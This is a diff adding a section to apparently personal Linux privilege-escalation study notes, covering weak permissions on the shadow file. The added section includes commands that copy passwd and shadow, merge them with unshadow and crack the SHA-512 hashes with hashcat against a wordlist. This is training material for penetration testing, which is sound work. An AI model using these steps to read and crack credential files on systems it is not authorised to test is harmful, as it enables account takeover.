@@ -64,3 +64,33 @@ Tools: [Kernal Exploits](https://github.com/lucyoa/kernel-exploits)
 - [Looting for password](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#checklists)
 
 ## Escalation via Weak File Permissions
+
+- weak file permission of shadow file (shadow file should not have read access)
+  
+![alt text](image-8.png)
+
+- x is the placeholder for password (the password containe within the shadow file)
+
+![alt text](image-9.png)
+
+![alt text](image-10.png)
+
+### Crack Password within shadow file
+
+```bash
+nano passwd
+nano shadow
+unshadow passwd shadow
+nano unshadowed [save dalam file]
+hashcat -m 1800 hash /usr/share/wordlist/common.txt --show 
+```
+
+- Result
+
+![alt text](image-11.png)
+
+![alt text](image-12.png)
+
+
+- Reference for hash mode : [Hashing Types](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
